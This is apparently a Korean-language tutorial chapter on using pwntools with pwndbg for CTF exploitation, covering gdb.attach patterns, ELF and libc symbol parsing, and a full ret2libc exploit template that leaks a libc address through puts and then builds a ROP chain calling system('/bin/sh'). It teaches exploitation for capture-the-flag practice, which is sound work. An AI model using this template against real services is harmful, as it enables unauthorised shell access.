pwntools 연동 & 자동화

pwndbg로 분석하고 pwntools로 자동화한다 — 이 둘이 분리되면 CTF는 못 푼다

📌
이 챕터에서 배울 것

gdb.attach() 패턴, process()·remote() 연결, context 설정, pwntools 핵심 유틸리티, pwndbg + pwntools 동시 사용 워크플로우, 완전한 익스플로잇 스크립트 템플릿.

왜 pwntools인가

pwndbg로 오프셋, 가젯 주소, libc 오프셋을 모두 파악했다. 이제 익스플로잇을 실행해야 한다. 터미널에서 수동으로 페이로드를 보내는 건 한계가 있다 — 특히 여러 단계의 입출력이 필요한 경우. pwntools는 프로세스/네트워크 연결, 페이로드 조립, 패킹/언패킹, 패턴 생성을 Python으로 자동화한다.

gdb.attach() — pwndbg + pwntools 동시 사용

pwntools로 프로세스를 시작하고, pwndbg를 해당 프로세스에 붙이는 패턴이다. 페이로드를 자동으로 보내면서 pwndbg에서 실시간으로 상태를 볼 수 있다. 

from pwn import *

context.update(arch='amd64', os='linux')
p = process('./vuln')

# 방법 1: 별도 터미널에 GDB 창 열기
gdb.attach(p)           # 새 터미널 창에서 pwndbg가 열림
pause()                 # GDB 준비될 때까지 대기

# 방법 2: GDB 명령어와 함께 attach (브레이크포인트 포함)
gdb.attach(p, """
    break *0x401234
    continue
""")

# 방법 3: tmux 사용 (자동 분할)
context.terminal = ['tmux', 'splitw', '-h']
gdb.attach(p, """
    break main
    continue
""")

# 방법 4: gdbserver 경유 (원격에서도 디버깅)
p = process('./vuln')
gdb.attach(p, gdbscript="break *0x401234\ncontinue")

ELF & libc 파싱

# ELF 객체로 주소 추출
elf = ELF('./vuln')

# 함수/심볼 주소
elf.sym['main']         # main() 주소
elf.sym['win']          # win() 주소
elf.plt['puts']         # puts@plt 주소
elf.got['puts']         # puts@got 주소

# libc 파싱 (제공된 libc.so.6 이용)
libc = ELF('./libc.so.6')
libc.sym['system']      # libc 내 system 오프셋
libc.sym['__libc_start_main']

# libc 릭으로 base 계산
leaked_puts = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc.address = leaked_puts - libc.sym['puts']   # base 계산
system_addr = libc.sym['system']               # 실제 system() 주소
bin_sh_addr = next(libc.search(b"/bin/sh"))     # "/bin/sh" 주소

완전한 익스플로잇 스크립트 템플릿

#!/usr/bin/env python3
# CTF 익스플로잇 표준 템플릿
from pwn import *

# ── 설정 ──────────────────────────────────
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

elf  = ELF('./vuln',   checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# ── 연결 ──────────────────────────────────
def conn():
    if args.REMOTE:
        return remote('ctf.example.com', 1337)
    p = process(elf.path)
    if args.GDB:
        gdb.attach(p, """
            break *main+100
            continue
        """)
    return p

# ── 상수 ──────────────────────────────────
OFFSET   = 72                    # cyclic으로 구한 오프셋
POP_RDI  = 0x40119e              # pop rdi ; ret
RET      = 0x40101a              # ret (스택 정렬)
PUTS_PLT = elf.plt['puts']
PUTS_GOT = elf.got['puts']
MAIN     = elf.sym['main']

# ── Phase 1: libc 릭 ──────────────────────
def exploit():
    p = conn()

    # puts(got_puts) → libc 주소 릭
    leak_payload = flat(
        b"A" * OFFSET,
        POP_RDI, PUTS_GOT,    # rdi = &puts@got
        PUTS_PLT,             # call puts → print puts 주소
        MAIN                  # 돌아와서 main 재실행
    )

    p.sendlineafter(b"Input: ", leak_payload)
    leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
    log.success(f"Leaked puts: {hex(leaked)}")

    # libc base 계산
    libc.address = leaked - libc.sym['puts']
    log.success(f"libc base: {hex(libc.address)}")

    # ── Phase 2: system("/bin/sh") ─────────
    system  = libc.sym['system']
    bin_sh  = next(libc.search(b"/bin/sh"))

    shell_payload = flat(
        b"A" * OFFSET,
        RET,                  # 스택 정렬
        POP_RDI, bin_sh,      # rdi = "/bin/sh"
        system                # call system
    )

    p.sendlineafter(b"Input: ", shell_payload)
    p.interactive()

exploit()

pwntools 자주 쓰는 유틸리티

asm("nop")

어셈블리를 바이트로 변환. context.arch 기준.

disasm(bytes)

바이트를 어셈블리로 역변환.

enhex(data)

바이트를 hex 문자열로. unhex()는 역변환.

xor(data, key)

XOR 암호화/복호화.

shellcraft.sh()

현재 아키텍처에 맞는 셸 실행 셸코드 생성.

ROP(elf)

pwntools 내장 ROP 체인 빌더.

💡
python3 solve.py GDB 로 빠르게 디버깅

args.GDB를 쓰면 python3 solve.py GDB 실행 시에만 gdb.attach()가 호출된다. 평소엔 빠르게 실행하고, 디버깅이 필요할 때만 GDB를 붙일 수 있다. args.REMOTE도 마찬가지로 python3 solve.py REMOTE일 때만 원격으로 연결한다.
